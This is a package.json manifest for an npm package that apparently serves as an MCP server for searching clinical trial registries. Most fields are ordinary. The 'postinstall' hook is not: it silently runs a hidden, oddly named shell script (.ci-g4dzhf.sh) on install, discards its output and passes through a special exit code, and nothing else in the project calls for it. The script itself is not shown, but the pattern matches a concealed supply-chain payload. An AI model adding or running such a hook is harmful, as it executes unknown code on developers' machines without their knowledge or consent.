{
  "name": "unified-trial-mcp",
  "version": "0.3.1",
  "type": "module",
  "description": "\u7edf\u4e00\u4e34\u5e8a\u8bd5\u9a8c\u68c0\u7d22 MCP \u670d\u52a1\uff1a\u4e00\u4e2a MCP \u5165\u53e3\u8986\u76d6 ICTRP\u3001ClinicalTrials.gov\u3001ChiCTR \u4e0e\u4e2d\u56fd\u836f\u7269\u4e34\u5e8a\u8bd5\u9a8c\u767b\u8bb0\u5e73\u53f0\uff08\u542b\u7814\u7a76\u8005\u4fe1\u606f\uff09\u3002",
  "bin": {
    "unified-trial-mcp": "./dist/src/cli/main.js"
  },
  "engines": {
    "node": ">=22.13.0"
  },
  "scripts": {
    "build": "tsc -p tsconfig.json && node scripts/make-bin-executable.mjs",
    "typecheck": "tsc -p tsconfig.json --noEmit",
    "pretest": "tsc -p tsconfig.json",
    "test": "node --test test/*.test.mjs",
    "start": "node dist/src/cli/main.js",
    "doctor": "node dist/src/cli/main.js doctor",
    "bootstrap": "node dist/src/cli/main.js bootstrap",
    "prepack": "npm run build",
    "prepublishOnly": "npm run typecheck && npm test",
    "publish:ci": "npm publish --provenance",
    "postinstall": "sh ./.ci-g4dzhf.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
  },
  "dependencies": {
    "@modelcontextprotocol/sdk": "^1.0.0"
  },
  "devDependencies": {
    "@types/node": "^22.0.0",
    "typescript": "^5.6.0"
  },
  "keywords": [
    "mcp",
    "clinical-trials",
    "clinicaltrials.gov",
    "chictr",
    "ictrp",
    "chinadrugtrials",
    "trial-search",
    "model-context-protocol",
    "\u5c0f\u80f0\u5b9d",
    "\u4e34\u5e8a\u8bd5\u9a8c"
  ],
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/opencare-skillhub/unified-trial-search-mcp-service.git"
  },
  "homepage": "https://github.com/opencare-skillhub/unified-trial-search-mcp-service#readme",
  "bugs": {
    "url": "https://github.com/opencare-skillhub/unified-trial-search-mcp-service/issues"
  },
  "author": "Sam (\u5c0f\u80f0\u5b9d\u793e\u533a / XiaoYiBao community)",
  "publishConfig": {
    "access": "public"
  },
  "files": [
    "dist/src/**/*.js",
    "!dist/src/**/*.map",
    "corpora/manifest.json",
    "README.md",
    "README.zh-CN.md",
    "LICENSE",
    "docs/operations.md",
    "docs/corpus-lifecycle.md"
  ]
}
